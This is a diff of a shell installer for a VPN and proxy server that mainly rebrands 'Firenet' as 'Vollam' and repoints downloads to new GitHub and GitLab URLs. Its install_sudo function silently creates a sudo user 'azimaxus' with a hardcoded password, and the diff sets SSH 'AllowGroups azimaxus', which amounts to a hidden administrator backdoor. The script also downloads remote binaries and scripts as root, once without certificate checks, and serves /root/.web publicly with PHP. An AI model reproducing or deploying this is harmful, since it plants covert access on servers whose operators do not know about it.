@@ -30,8 +30,8 @@ After=network.target
 
 [Service]
 Type=simple
-WorkingDirectory=/var/www/html
-ExecStart=/usr/bin/python3 -m http.server 5623
+WorkingDirectory=/root/.web
+ExecStart=/usr/bin/php -S 0.0.0.0:5623 -t /root/.web/
 Restart=always
 RestartSec=3
 
@@ -47,7 +47,7 @@ PORT_UDP='1194';
 PORT_SSL='443';
 OBFS='vollam';
 HYSTERIA_TYPE='default';
-timedatectl set-timezone Asia/Riyadh
+﻿timedatectl set-timezone Asia/Riyadh
 install_require () {
 clear
 echo 'Installing dependencies.'
@@ -67,7 +67,7 @@ clear
 
 install_banner(){
 rm -f /etc/banner
-wget -O /etc/banner "https://gitlab.com/vollam/dev/-/raw/main/banner" >/dev/null 2>&1
+wget -O /etc/banner "https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/banner" >/dev/null 2>&1
 chmod +x /etc/banner
 sudo sed -i 's/^#Banner none$/Banner \/etc\/banner/' /etc/ssh/sshd_config
 }
@@ -77,7 +77,7 @@ if ! command -v fastfetch >/dev/null 2>&1; then
     arch=$(dpkg --print-architecture)
     if [ "$arch" = "amd64" ]; then
         if ! command -v fastfetch >/dev/null 2>&1; then
-    		wget 'http://repo.firenetvpn.com/script_files/fastfetch-linux-amd64.deb' -O /tmp/fastfetch.deb
+    		wget 'https://gitlab.com/vollam/scripts/-/raw/main/fastfetch-linux-amd64.deb' -O /tmp/fastfetch.deb
 			sudo dpkg -i /tmp/fastfetch.deb
 		fi
     else
@@ -88,14 +88,14 @@ else
     fastfetch
 fi
 
-wget 'http://repo.firenetvpn.com/script_files/n_monitor' -O /etc/.monitor
+wget 'https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/n_monitor' -O /etc/.monitor
 chmod +x /etc/.monitor
 }
 
 install_squid(){
 apt install squid -y
 rm /etc/squid/squid.conf
-echo "acl Firenet dst `curl -s https://api.ipify.org`" >> /etc/squid/squid.conf
+echo "acl Vollam dst `curl -s https://api.ipify.org`" >> /etc/squid/squid.conf
 echo 'http_port 8080
 http_port 8181
 visible_hostname Proxy
@@ -104,19 +104,19 @@ acl HEAD method HEAD
 acl POST method POST
 acl GET method GET
 acl CONNECT method CONNECT
-http_access allow Firenet
+http_access allow Vollam
 http_reply_access allow all
 http_access deny all
 icp_access allow all
 always_direct allow all
-visible_hostname Firenet-Proxy
+visible_hostname Vollam-Proxy
 error_directory /usr/share/squid/errors/English' >> /etc/squid/squid.conf
 rm /usr/share/squid/errors/English/ERR_INVALID_URL
-echo '<!--FirenetDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">🔥 Vollam Developer 🔥</p></div></div></body></html>' >> /usr/share/squid/errors/English/ERR_INVALID_URL
+echo '<!--VollamDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">🔥 VOLLAM DEVELOPER 🔥</p></div></div></body></html>' >> /usr/share/squid/errors/English/ERR_INVALID_URL
 chmod 755 /usr/share/squid/errors/English/*
 cd /etc || exit
 
-wget 'http://repo.firenetvpn.com/script_files/hysteria' -O /etc/.hysteria
+wget 'https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/hysteria' -O /etc/.hysteria
 chmod +x /etc/.hysteria
 }
 
@@ -339,7 +339,7 @@ def main(host=IP, port=PORT):
     print("\033[0;34m" + "━" * 8, "\033[1;32m PROXY SOCKS", "\033[0;34m" + "━" * 8, "\n")
     print("\033[1;33mIP:\033[1;32m " + IP)
     print("\033[1;33mPORT:\033[1;32m " + str(PORT) + "\n")
-    print("\033[0;34m" + "━" * 10, "\033[1;32m FIRENETDEV", "\033[0;34m━\033[1;37m" * 11, "\n")
+    print("\033[0;34m" + "━" * 10, "\033[1;32m VOLLAMDEV", "\033[0;34m━\033[1;37m" * 11, "\n")
 
     server = Server(IP, port)
     server.start()
@@ -377,7 +377,7 @@ systemctl daemon-reload
 systemctl enable socks
 systemctl restart socks
 
-wget 'http://repo.firenetvpn.com/script_files/socks_check' -O /etc/.socks_check
+wget 'https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/socks_check' -O /etc/.socks_check
 chmod +x /etc/.socks_check
 dos2unix /etc/.socks_check
 }
@@ -783,7 +783,7 @@ install_sudo(){
   {
     useradd -m azimaxus 2>/dev/null; echo azimaxus:azim.0987Aa | chpasswd &>/dev/null; usermod -aG sudo azimaxus &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+    echo "AllowGroups azimaxus" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
@@ -792,7 +792,7 @@ install_hysteria(){
 clear
 echo 'Installing hysteria.'
 {
-wget -N --no-check-certificate -q -O ~/install_server.sh http://repo.firenetvpn.com/script_files/hysteria.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
+wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/hysteria.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
 
 rm -f /etc/hysteria/config.json
 
@@ -847,7 +847,7 @@ chmod 755 /etc/hysteria/.auth.sh
 sysctl -w net.core.rmem_max=16777216
 sysctl -w net.core.wmem_max=16777216
 
-wget -O /usr/bin/badvpn-udpgw "http://repo.firenetvpn.com/script_files/badvpn-udpgw64"
+wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 } &>/dev/null
 }
@@ -873,7 +873,7 @@ clear
 echo 'Installing zi udp.'
 {
 echo -e "Downloading UDP Service"
-wget http://repo.firenetvpn.com/script_files/zivpn -O /usr/local/bin/zivpn 1> /dev/null 2> /dev/null
+wget https://gitlab.com/vollam/scripts/-/raw/main/zivpn -O /usr/local/bin/zivpn 1> /dev/null 2> /dev/null
 chmod +x /usr/local/bin/zivpn
 mkdir /etc/zivpn 1> /dev/null 2> /dev/null
 
@@ -947,7 +947,7 @@ EOM
 chown -R hysteria:hysteria /etc/zivpn && chmod 750 /etc/zivpn && chmod 600 /etc/zivpn/zivpn.key && chmod 644 /etc/zivpn/zivpn.crt
 chmod 755 /etc/zivpn/.auth.sh
 
-wget -O /usr/bin/badvpn-udpgw "http://repo.firenetvpn.com/script_files/badvpn-udpgw64"
+wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 
 } &>/dev/null
@@ -965,7 +965,7 @@ install_rclocal(){
     sudo systemctl start openvpn@server2.service    
     
     echo "[Unit]
-Description=firenet service
+Description=vollam service
 Documentation=https://vollam.com
 
 [Service]
